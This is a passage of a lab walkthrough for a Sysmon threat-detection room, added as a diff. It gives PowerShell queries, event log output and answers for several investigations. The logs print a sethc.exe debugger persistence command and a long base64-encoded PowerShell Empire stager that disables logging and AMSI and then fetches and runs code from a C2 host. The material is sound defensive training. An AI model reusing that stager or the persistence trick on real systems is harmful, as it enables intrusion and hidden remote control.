@@ -541,3 +541,546 @@ The first technique we will be looking at is hiding files using alternate data s
 </RuleGroup>
 ```
 Open `C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Hunting_ADS.evtx` in Event Viewer to view hidden files using an alternate data stream.
+![](https://i.imgur.com/kuQrOwh.png)
+![](https://i.imgur.com/HLQMibL.png)
+As you can see the event will show us the location of the file name as well as the contents of the file this will be useful if an investigation is necessary.
+Detecting Remote Threads
+Adversaries also commonly use remote threads to evade detections in combination with other techniques. Remote threads are created using the Windows API CreateRemoteThread and can be accessed using OpenThread and ResumeThread. This is used in multiple evasion techniques including DLL Injection, Thread Hijacking, and Process Hollowing. We will be using the Sysmon event ID 8 from the SwiftOnSecurity configuration file. The code snippet below from the rule will exclude common remote threads without including any specific attributes this allows for a more open and precise event rule.
+```text
+<RuleGroup name="" groupRelation="or">
+	<CreateRemoteThread onmatch="exclude">
+		<SourceImage condition="is">C:\Windows\system32\svchost.exe</SourceImage>
+		<TargetImage condition="is">C:\Program Files (x86)\Google\Chrome\Application\chrome.exe</TargetImage>
+	</CreateRemoteThread>
+</RuleGroup>
+```
+Open `C:\Users\THM-Analyst\Desktop\Scenarios\Practice\Detecting_RemoteThreads.evtx` in Event Viewer to observe a Process Hollowing attack that abuses the notepad.exe process.
+![](https://i.imgur.com/R2cRHqa.png)
+As you can see in the above image powershell.exe is creating a remote thread and accessing notepad.exe this is obviously a PoC and could in theory execute any other kind of executable or DLL. The specific technique used in this example is called Reflective PE Injection.
+Detecting Evasion Techniques with PowerShell
+We have already gone through a majority of the syntax required to use PowerShell with events. Like previous tasks, we will be using Get-WinEvent along with the XPath to filter and search for files that use an alternate data stream or create a remote thread. In both of the events, we will only need to filter by the EventID because the rule used within the configuration file is already doing a majority of the heavy lifting.
+Detecting Alternate Data Streams
+Syntax: `Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=15'`
+![](https://i.imgur.com/etAHMEt.png)
+Detecting Remote Thread Creation
+Syntax: `Get-WinEvent -Path <Path to Log> -FilterXPath '*/System/EventID=8'`
+![](https://i.imgur.com/PJNairD.png)
+Read the above and practice detecting evasion techniques
+*No answer needed*
+### Practical Investigations
+Event files used within this task have been sourced from the EVTX-ATTACK-SAMPLES and SysmonResourcesGithub repositories.
+You can download the event logs used in this room from this task or you can open them in the Investigations folder on the provided machine.
+Investigation 1 - ugh, BILL THAT'S THE WRONG USB!
+In this investigation, your team has received reports that a malicious file was dropped onto a host by a malicious USB. They have pulled the logs suspected and have tasked you with running the investigation for it.
+Logs are located in `C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-1`.
+Investigation 2 - This isn't an HTML file?
+Another suspicious file has appeared in your logs and has managed to execute code masking itself as an HTML file, evading your anti-virus detections. Open the logs and investigate the suspicious file.
+Logs are located in `C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-2`.
+Investigation 3.1 - 3.2 - Where's the bouncer when you need him
+Your team has informed you that the adversary has managed to set up persistence on your endpoints as they continue to move throughout your network. Find how the adversary managed to gain persistence using logs provided.
+Logs are located in `C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-3.1`
+and `C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-3.2`.
+Investigation 4 - Mom look! I built a botnet!
+As the adversary has gained a solid foothold onto your network it has been brought to your attention that they may have been able to set up C2 communications on some of the endpoints. Collect the logs and continue your investigation.
+Logs are located in `C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-4`.
+```text
+PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-1.evtx -FilterXPath '*/System/EventID=13 and */EventData/Data[@Name="Image"]="C:\Windows\system32\svchost.exe"' | FL
+
+TimeCreated  : 3/6/2018 6:57:51 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 13
+Message      : Registry value set:
+               RuleName: SetValue
+               EventType: 2018-03-06 06:57:51.007
+               UtcTime: {2ca4c7ef-396e-5a9e-0000-001007c50000}
+               ProcessGuid: 616
+               ProcessId: 0
+               Image: HKLM\System\CurrentControlSet\Enum\WpdBusEnumRoot\UMB\2&37c186b&0&STORAGE#VOLUME#_??_USBSTOR#DISK
+               &VEN_SANDISK&PROD_U3_CRUZER_MICRO&REV_8.01#4054910EF19005B3&0#\FriendlyName
+               TargetObject: U
+               Details: %8
+```
+What is the full registry key of the USB device calling svchost.exe in Investigation 1?
+`HKLM\System\CurrentControlSet\Enum\WpdBusEnumRoot\UMB\2&37c186b&0&STORAGE#VOLUME#_??_USBSTOR#DISK                &VEN_SANDISK&PROD_U3_CRUZER_MICRO&REV_8.01#4054910EF19005B3&0#\FriendlyName`
+```text
+PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-1.evtx -FilterXPath '*/System/EventID=9' | fl
+
+TimeCreated  : 3/6/2018 6:57:51 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 9
+Message      : RawAccessRead detected:
+               RuleName: 2018-03-06 06:57:51.070
+               UtcTime: {2ca4c7ef-396f-5a9e-0000-0010a06d0100}
+               ProcessGuid: 1388
+               ProcessId: 0
+               Image: \Device\HarddiskVolume3
+               Device: %6
+
+TimeCreated  : 3/6/2018 6:57:51 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 9
+Message      : RawAccessRead detected:
+               RuleName: 2018-03-06 06:57:51.054
+               UtcTime: {2ca4c7ef-396e-5a9e-0000-00104f270100}
+               ProcessGuid: 892
+               ProcessId: 0
+               Image: \Device\HarddiskVolume3
+               Device: %6
+
+TimeCreated  : 3/6/2018 6:57:51 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 9
+Message      : RawAccessRead detected:
+               RuleName: 2018-03-06 06:57:51.023
+               UtcTime: {2ca4c7ef-396e-5a9e-0000-00104f270100}
+               ProcessGuid: 892
+               ProcessId: 0
+               Image: \Device\HarddiskVolume3
+               Device: %6
+
+TimeCreated  : 3/6/2018 6:57:50 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 9
+Message      : RawAccessRead detected:
+               RuleName: 2018-03-06 06:57:50.992
+               UtcTime: {2ca4c7ef-396e-5a9e-0000-00104f270100}
+               ProcessGuid: 892
+               ProcessId: 0
+               Image: \Device\HarddiskVolume3
+               Device: %6
+```
+What is the device name when being called by RawAccessRead in Investigation 1?
+`\Device\HarddiskVolume3`
+```text
+PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-1.evtx -FilterXPath '*/System/EventID=9' | fl
+
+TimeCreated  : 3/6/2018 6:57:51 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 9
+Message      : RawAccessRead detected:
+               RuleName: 2018-03-06 06:57:51.070
+               UtcTime: {2ca4c7ef-396f-5a9e-0000-0010a06d0100}
+               ProcessGuid: 1388
+               ProcessId: 0
+               Image: \Device\HarddiskVolume3
+               Device: %6
+
+TimeCreated  : 3/6/2018 6:57:51 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 9
+Message      : RawAccessRead detected:
+               RuleName: 2018-03-06 06:57:51.054
+               UtcTime: {2ca4c7ef-396e-5a9e-0000-00104f270100}
+               ProcessGuid: 892
+               ProcessId: 0
+               Image: \Device\HarddiskVolume3
+               Device: %6
+
+TimeCreated  : 3/6/2018 6:57:51 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 9
+Message      : RawAccessRead detected:
+               RuleName: 2018-03-06 06:57:51.023
+               UtcTime: {2ca4c7ef-396e-5a9e-0000-00104f270100}
+               ProcessGuid: 892
+               ProcessId: 0
+               Image: \Device\HarddiskVolume3
+               Device: %6
+
+TimeCreated  : 3/6/2018 6:57:50 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 9
+Message      : RawAccessRead detected:
+               RuleName: 2018-03-06 06:57:50.992
+               UtcTime: {2ca4c7ef-396e-5a9e-0000-00104f270100}
+               ProcessGuid: 892
+               ProcessId: 0
+               Image: \Device\HarddiskVolume3
+               Device: %6
+
+PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-1.evtx -FilterXPath '*/System/EventID=1 and */EventData/Data[@Name="Image"]' | fl
+
+TimeCreated  : 3/6/2018 6:57:51 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 1
+Message      : Process Create:
+               RuleName: 2018-03-06 06:57:51.132
+               UtcTime: {2ca4c7ef-3bef-5a9e-0000-001081120e00}
+               ProcessGuid: 3348
+               ProcessId: 0
+               Image: 6.1.7600.16385 (win7_rtm.090713-1255)
+               FileVersion: Windows Calculator
+               Description: Microsoft® Windows® Operating System
+               Product: Microsoft Corporation
+               Company: calc.exe
+               OriginalFileName: C:\Windows\system32\
+               CommandLine: WIN-7JKBJEGBO38\q
+               CurrentDirectory: {2ca4c7ef-396f-5a9e-0000-002001500100}
+               User: 0x15001
+               LogonGuid: 1
+               LogonId: 0x0
+               TerminalSessionId: 0
+               IntegrityLevel: {2ca4c7ef-3bef-5a9e-0000-0010a5110e00}
+               Hashes: 4024
+               ParentProcessGuid: C:\Windows\System32\rundll32.exe
+               ParentProcessId: 0
+               ParentImage: %21
+               ParentCommandLine: %22
+
+TimeCreated  : 3/6/2018 6:57:51 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 1
+Message      : Process Create:
+               RuleName: 2018-03-06 06:57:51.117
+               UtcTime: {2ca4c7ef-3bef-5a9e-0000-0010a5110e00}
+               ProcessGuid: 4024
+               ProcessId: 0
+               Image: 6.1.7600.16385 (win7_rtm.090713-1255)
+               FileVersion: Windows host process (Rundll32)
+               Description: Microsoft® Windows® Operating System
+               Product: Microsoft Corporation
+               Company: rundll32.exe
+               OriginalFileName: C:\Windows\system32\
+               CommandLine: WIN-7JKBJEGBO38\q
+               CurrentDirectory: {2ca4c7ef-396f-5a9e-0000-002001500100}
+               User: 0x15001
+               LogonGuid: 1
+               LogonId: 0x0
+               TerminalSessionId: 0
+               IntegrityLevel: {2ca4c7ef-396f-5a9e-0000-0010a06d0100}
+               Hashes: 1388
+               ParentProcessGuid: C:\Windows\explorer.exe
+               ParentProcessId: 0
+               ParentImage: %21
+               ParentCommandLine: %22
+
+TimeCreated  : 3/6/2018 6:57:48 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 1
+Message      : Process Create:
+               RuleName: 2018-03-06 06:57:48.862
+               UtcTime: {2ca4c7ef-3bec-5a9e-0000-0010d9070e00}
+               ProcessGuid: 2532
+               ProcessId: 0
+               Image: 6.1.7600.16385 (win7_rtm.090713-1255)
+               FileVersion: Windows Driver Foundation - User-mode Driver Framework Host Process
+               Description: Microsoft® Windows® Operating System
+               Product: Microsoft Corporation
+               Company: "C:\Windows\system32\WUDFHost.exe" -HostGUID:{193a1820-d9ac-4997-8c55-be817523f6aa}
+               -IoEventPortName:HostProcess-b3991627-8e80-4a48-be41-a12b4979d572
+               -SystemEventPortName:HostProcess-504712cb-dc72-4707-891c-16eb8c62dfad
+               -IoCancelEventPortName:HostProcess-f886f18d-a113-4114-b00c-6b2841510043
+               -NonStateChangingEventPortName:HostProcess-8464b40d-8d03-4f17-8b35-e9bb1151d881
+               -ServiceSID:S-1-5-80-2652678385-582572993-1835434367-1344795993-749280709
+               -LifetimeId:ce14470f-7eed-46d5-b7e3-273df615d259
+               OriginalFileName: C:\Windows\system32\
+               CommandLine: NT AUTHORITY\LOCAL SERVICE
+               CurrentDirectory: {2ca4c7ef-396e-5a9e-0000-0020e5030000}
+               User: 0x3e5
+               LogonGuid: 0
+               LogonId: 0x0
+               TerminalSessionId: 0
+               IntegrityLevel: {2ca4c7ef-396e-5a9e-0000-00101e230100}
+               Hashes: 848
+               ParentProcessGuid: C:\Windows\System32\svchost.exe
+               ParentProcessId: 0
+               ParentImage: %21
+               ParentCommandLine: %22
+```
+What is the first exe the process executes in Investigation 1?
+*rundll32.exe*
+```text
+PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-2.evtx -FilterXPath '*/System/EventID=1' | fl
+
+TimeCreated  : 6/15/2019 7:14:32 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 1
+Message      : Process Create:
+               RuleName:
+               UtcTime: 2019-06-15 07:14:32.622
+               ProcessGuid: {365abb72-9ad8-5d04-0000-0010c08c1000}
+               ProcessId: 3892
+               Image: C:\Windows\System32\dllhost.exe
+               FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
+               Description: COM Surrogate
+               Product: Microsoft® Windows® Operating System
+               Company: Microsoft Corporation
+               OriginalFileName: C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
+               CommandLine: C:\Windows\system32\
+               CurrentDirectory: IEWIN7\IEUser
+               User: {365abb72-98e4-5d04-0000-0020a4350100}
+               LogonGuid: 0x135a4
+               LogonId: 0x1
+               TerminalSessionId: 0
+               IntegrityLevel: SHA1=ACE762C51DB1908C858C898D7E0F9B36F788D2D9,MD5=A63DC5C2EA944E6657203E0C8EDEAF61,SHA25
+               6=F7AD4B09AFB301CE46DF695B22114331A57D52E6D4163FF74787BF68CCF44C78,IMPHASH=EB9A02895A60E58547EFF153D6FF8
+               829
+               Hashes: {365abb72-1771-5d05-0000-001030790000}
+               ParentProcessGuid: 616
+               ParentProcessId: 0
+               ParentImage: C:\Windows\system32\svchost.exe -k DcomLaunch
+               ParentCommandLine: %22
+
+TimeCreated  : 6/15/2019 7:13:42 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 1
+Message      : Process Create:
+               RuleName:
+               UtcTime: 2019-06-15 07:13:42.278
+               ProcessGuid: {365abb72-9aa6-5d04-0000-00109c850f00}
+               ProcessId: 652
+               Image: C:\Windows\System32\mshta.exe
+               FileVersion: 11.00.9600.16428 (winblue_gdr.131013-1700)
+               Description: Microsoft (R) HTML Application host
+               Product: Internet Explorer
+               Company: Microsoft Corporation
+               OriginalFileName: "C:\Windows\System32\mshta.exe"
+               "C:\Users\IEUser\AppData\Local\Microsoft\Windows\Temporary Internet
+               Files\Content.IE5\S97WTYG7\update.hta"
+               CommandLine: C:\Users\IEUser\Desktop\
+               CurrentDirectory: IEWIN7\IEUser
+               User: {365abb72-98e4-5d04-0000-0020a4350100}
+               LogonGuid: 0x135a4
+               LogonId: 0x1
+               TerminalSessionId: 0
+               IntegrityLevel: SHA1=D4F0397F83083E1C6FB0894187CC72AEBCF2F34F,MD5=ABDFC692D9FE43E2BA8FE6CB5A8CB95A,SHA25
+               6=949485BA939953642714AE6831D7DCB261691CAC7CBB8C1A9220333801F60820,IMPHASH=00B1859A95A316FD37DFF42104809
+               07A
+               Hashes: {365abb72-9972-5d04-0000-0010f0490c00}
+               ParentProcessGuid: 3660
+               ParentProcessId: 0
+               ParentImage: "C:\Program Files\Internet Explorer\iexplore.exe" C:\Users\IEUser\Downloads\update.html
+               ParentCommandLine: %22
+```
+What is the full path of the payload in Investigation 2?
+`C:\Users\IEUser\AppData\Local\Microsoft\Windows\Temporary Internet                Files\Content.IE5\S97WTYG7\update.hta`
+What is the full path of the file the payload masked itself as in Investigation 2?
+`C:\Users\IEUser\Downloads\update.html`
+What signed binary executed the payload in Investigation 2?
+`C:\Windows\System32\mshta.exe`
+```text
+PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-2.evtx -FilterXPath '*/System/EventID=3' | fl
+
+TimeCreated  : 6/15/2019 7:13:44 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName:
+               UtcTime: 2019-06-15 07:13:42.577
+               ProcessGuid: {365abb72-9aa6-5d04-0000-00109c850f00}
+               ProcessId: 652
+               Image: C:\Windows\System32\mshta.exe
+               User: IEWIN7\IEUser
+               Protocol: tcp
+               Initiated: true
+               SourceIsIpv6: false
+               SourceIp: 10.0.2.13
+               SourceHostname: IEWIN7
+               SourcePort: 49159
+               SourcePortName:
+               DestinationIsIpv6: false
+               DestinationIp: 10.0.2.18
+               DestinationHostname:
+               DestinationPort: 4443
+               DestinationPortName:
+```
+What is the IP of the adversary in Investigation 2?
+*10.0.2.18*
+What back connect port is used in Investigation 2?
+*4443*
+```text
+PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-3.1.evtx -FilterXPath '*/System/EventID=3' | fl
+
+TimeCreated  : 2/12/2018 9:15:59 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: 2018-02-12 09:15:58.664
+               UtcTime: {b231f4ab-5a53-5a81-0000-0010c752ef01}
+               ProcessGuid: 12224
+               ProcessId: 0
+               Image: DESKTOP-O153T4R\q
+               User: tcp
+               Protocol: true
+               Initiated: false
+               SourceIsIpv6: 172.16.199.179
+               SourceIp: DESKTOP-O153T4R.localdomain
+               SourceHostname: 54923
+               SourcePort: 0
+               SourcePortName: false
+               DestinationIsIpv6: 172.30.1.253
+               DestinationIp: empirec2
+               DestinationHostname: 80
+               DestinationPort: 0
+               DestinationPortName: %18
+
+TimeCreated  : 2/12/2018 9:15:58 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: 2018-02-12 09:15:58.434
+               UtcTime: {b231f4ab-5a53-5a81-0000-0010c752ef01}
+               ProcessGuid: 12224
+               ProcessId: 0
+               Image: DESKTOP-O153T4R\q
+               User: tcp
+               Protocol: true
+               Initiated: false
+               SourceIsIpv6: 172.16.199.179
+               SourceIp: DESKTOP-O153T4R.localdomain
+               SourceHostname: 54922
+               SourcePort: 0
+               SourcePortName: false
+               DestinationIsIpv6: 172.30.1.253
+               DestinationIp: empirec2
+               DestinationHostname: 80
+               DestinationPort: 0
+               DestinationPortName: %18
+
+TimeCreated  : 2/12/2018 9:15:53 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: 2018-02-12 09:15:53.406
+               UtcTime: {b231f4ab-5a53-5a81-0000-0010c752ef01}
+               ProcessGuid: 12224
+               ProcessId: 0
+               Image: DESKTOP-O153T4R\q
+               User: tcp
+               Protocol: true
+               Initiated: false
+               SourceIsIpv6: 172.16.199.179
+               SourceIp: DESKTOP-O153T4R.localdomain
+               SourceHostname: 54921
+               SourcePort: 0
+               SourcePortName: false
+               DestinationIsIpv6: 172.30.1.253
+               DestinationIp: empirec2
+               DestinationHostname: 80
+               DestinationPort: 0
+               DestinationPortName: %18
+```
+What is the IP of the suspected adversary in Investigation 3.1?
+*172.30.1.253*
+What is the hostname of the affected endpoint in Investigation 3.1?
+*DESKTOP-O153T4R*
+What is the hostname of the C2 server connecting to the endpoint in Investigation 3.1?
+*empirec2*
+```text
+PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-3.1.evtx -FilterXPath '*/System/EventID=13' | fl
+
+TimeCreated  : 2/12/2018 9:15:57 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 13
+Message      : Registry value set:
+               RuleName: SetValue
+               EventType: 2018-02-12 09:15:57.046
+               UtcTime: {b231f4ab-5a53-5a81-0000-0010c752ef01}
+               ProcessGuid: 12224
+               ProcessId: 0
+               Image: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger
+               TargetObject: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp
+               HKLM:Software\Microsoft\Network debug).debug);start -Win Hidden -A \"-enc $x\" powershell";exit;
+               Details: %8
+
+TimeCreated  : 2/12/2018 9:15:57 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 13
+Message      : Registry value set:
+               RuleName: SetValue
+               EventType: 2018-02-12 09:15:57.014
+               UtcTime: {b231f4ab-5a53-5a81-0000-0010c752ef01}
+               ProcessGuid: 12224
+               ProcessId: 0
+               Image: HKLM\SOFTWARE\Microsoft\Network\debug
+               TargetObject: SQBGACgAJABQAFMAVgBlAFIAUwBJAE8ATgBUAEEAYgBMAGUALgBQAFMAVgBFAFIAUwBJAE8ATgAuAE0AYQBqAG8AUg
+               AgAC0AZwBFACAAMwApAHsAJABHAFAARgA9AFsAcgBFAEYAXQAuAEEAUwBTAEUAbQBiAEwAWQAuAEcAZQBUAFQAWQBwAGUAKAAnAFMAeQ
+               BzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdA
+               BGAGkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJw
+               ArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALg
+               BHAGUAVABWAEEAbAB1AGUAKAAkAG4AVQBsAEwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAaw
+               BMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJw
+               BdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQw
+               BbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdA
+               BCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAYQBsAD0AWwBDAE8AbABMAEUAYw
+               BUAEkAbwBOAHMALgBHAEUATgBFAFIAaQBDAC4ARABpAGMAdABpAG8ATgBBAHIAeQBbAHMAdAByAEkATgBHACwAUwBZAFMAdABFAE0ALg
+               BPAGIAagBFAGMAVABdAF0AOgA6AE4AZQB3ACgAKQA7ACQAdgBBAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQg
+               AnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAGwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQ
+               BwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQ
+               BfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8Acw
+               BvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbw
+               BnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUATABTAEUAewBbAFMAYwByAEkAcAB0AEIATABPAGMAawBdAC4AIgBHAGUAdABGAEkAZQ
+               BgAGwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJw
+               ApAC4AUwBlAFQAVgBhAGwAdQBFACgAJABuAFUATABMACwAKABOAGUAVwAtAE8AQgBKAEUAQwB0ACAAQwBPAGwAbABFAEMAdABpAG8Abg
+               BTAC4ARwBlAE4AZQBSAGkAYwAuAEgAQQBTAEgAUwBFAHQAWwBzAFQAcgBpAE4AZwBdACkAKQB9AFsAUgBlAGYAXQAuAEEAUwBzAEUATQ
+               BCAEwAeQAuAEcARQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQ
+               BvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAHQARgBpAEUAbABkACgAJwBhAG0Acw
+               BpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEATA
+               BVAEUAKAAkAE4AdQBMAEwALAAkAFQAcgBVAGUAKQB9ADsAfQA7AFsAUwB5AFMAdABlAE0ALgBOAGUAdAAuAFMAZQBSAHYASQBjAEUAUA
+               BPAEkAbgBUAE0AYQBOAEEAZwBlAHIAXQA6ADoARQBYAFAAZQBDAHQAMQAwADAAQwBvAE4AVABpAE4AdQBFAD0AMAA7ACQAdwBjAD0ATg
+               BFAHcALQBPAEIASgBlAGMAVAAgAFMAeQBTAHQARQBNAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBFAE4AdAA7ACQAdQA9ACcATQBvAHoAaQ
+               BsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdA
+               AvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgAZQBhAEQARQByAFMALg
+               BBAEQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAQwAuAFAAUgBvAFgAWQA9AFsAUwBZAFMAVABlAE0ALg
+               BOAEUAVAAuAFcAZQBiAFIARQBxAFUAZQBTAHQAXQA6ADoARABFAGYAQQBVAEwAVABXAEUAYgBQAFIAbwB4AHkAOwAkAFcAYwAuAFAAUg
+               BPAHgAWQAuAEMAUgBlAGQARQBOAHQASQBhAGwAcwAgAD0AIABbAFMAeQBTAHQAZQBtAC4ATgBFAFQALgBDAFIAZQBkAEUATgBUAGkAQQ
+               BMAEMAYQBDAGgAZQBdADoAOgBEAEUAZgBBAFUATAB0AE4AZQB0AFcATwBSAEsAQwByAGUAZABFAG4AdABpAEEAbABTADsAJABTAGMAcg
+               BpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAHMAVABlAG0ALgBUAEUAWAB0AC4ARQ
+               BOAGMATwBkAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAWQB0AGUAcwAoACcANQA0ADEANgBkADcAYwBkADYAZQBmADEAOQ
+               A1AGEAMABmADcANgAyADIAYQA5AGMANQA2AGIANQA1AGUAOAA0ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJA
+               BTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJA
+               BLAC4AQwBPAHUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJA
+               BfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMg
+               A1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAHIAJA
+               BTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AZQ
+               BtAHAAaQByAGUAYwAyADoAOAAwACcAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJABXAGMALgBIAGUAYQ
+               BkAGUAUgBzAC4AQQBEAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQBSAHoAcQAvADQAZABiAFAANgBZAFIAUA
+               BZAHUASABCAHYAZABkAFQAQQAyAFQAWABVAHQAbwA9ACIAKQA7ACQARABBAFQAQQA9ACQAVwBDAC4ARABPAHcATgBsAE8AQQBkAEQAQQ
+               BUAEEAKAAkAFMAZQByACsAJAB0ACkAOwAkAGkAVgA9ACQARABhAFQAQQBbADAALgAuADMAXQA7ACQAZABhAFQAQQA9ACQAZABBAFQAYQ
+               BbADQALgAuACQARABBAHQAQQAuAEwAZQBOAGcAdABoAF0AOwAtAEoATwBJAG4AWwBDAEgAYQBSAFsAXQBdACgAJgAgACQAUgAgACQAZA
+               BhAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
+               Details: %8
+```
+Where in the registry was the payload stored in Investigation 3.1?
+`HKLM\SOFTWARE\Microsoft\Network\debug`
+What PowerShell launch code was used to launch the payload in Investigation 3.1?
+`"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp               HKLM:Software\Microsoft\Network debug).debug);start -Win Hidden -A \"-enc $x\" powershell";exit;`
+```text
